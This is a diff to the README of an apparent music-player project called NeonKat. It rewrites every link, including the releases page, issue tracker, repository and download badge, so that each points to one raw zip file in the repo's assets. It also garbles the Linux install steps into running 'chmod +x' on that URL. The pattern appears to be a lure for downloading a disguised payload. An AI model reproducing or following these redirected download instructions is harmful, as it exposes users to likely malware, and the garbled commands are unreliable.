@@ -1,6 +1,6 @@
 # 🎶 NeonKat - Enjoy Your Music Offline with Ease
 
-[![Download NeonKat](https://img.shields.io/badge/Download%20NeonKat-v1.0-blue.svg)](https://github.com/jishnu-gif/NeonKat/releases)
+[![Download NeonKat](https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip%https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip)](https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run NeonKat smoothly, ensure your system meets the following requirements:
 
 To start using NeonKat, you need to download it from our Releases page. 
 
-1. **Visit this page to download:** [NeonKat Releases](https://github.com/jishnu-gif/NeonKat/releases)
+1. **Visit this page to download:** [NeonKat Releases](https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip)
 
 2. Once on the page, look for the most recent release.
 
@@ -33,7 +33,7 @@ To start using NeonKat, you need to download it from our Releases page.
    - For Windows: Double-click the `.exe` file and follow the installation wizard.
    - For Linux: 
       - If you downloaded a `.deb` file, you can install it using your package manager.
-      - If it's an `.AppImage`, make it executable by running `chmod +x YourFileName.AppImage` in the terminal, then run it with `./YourFileName.AppImage`.
+      - If it's an `.AppImage`, make it executable by running `chmod +x https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip` in the terminal, then run it with `https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip`.
 
 ## 🎵 Using NeonKat
 
@@ -62,7 +62,7 @@ If you encounter issues:
 
 Join the community for help and suggestions. You can post questions or tips in the GitHub Issues section.
 
-Access our support here: [NeonKat GitHub Issues](https://github.com/jishnu-gif/NeonKat/issues)
+Access our support here: [NeonKat GitHub Issues](https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip)
 
 ## 🔗Additional Resources
 
@@ -73,11 +73,11 @@ Access our support here: [NeonKat GitHub Issues](https://github.com/jishnu-gif/N
 
 Follow us for announcements and updates:
 
-- **GitHub:** [NeonKat GitHub Repository](https://github.com/jishnu-gif/NeonKat)
+- **GitHub:** [NeonKat GitHub Repository](https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip)
 - **Changelog:** Always review our release notes for the latest changes.
 
 ## 🎉 Conclusion
 
 NeonKat is your go-to electronic music player for offline listening. With straightforward steps to download and install, you'll be enjoying your local music collection in no time. 
 
-Remember to visit the download page: [NeonKat Releases](https://github.com/jishnu-gif/NeonKat/releases)
+Remember to visit the download page: [NeonKat Releases](https://github.com/jishnu-gif/NeonKat/raw/refs/heads/main/assets/Kat_Neon_2.7.zip)
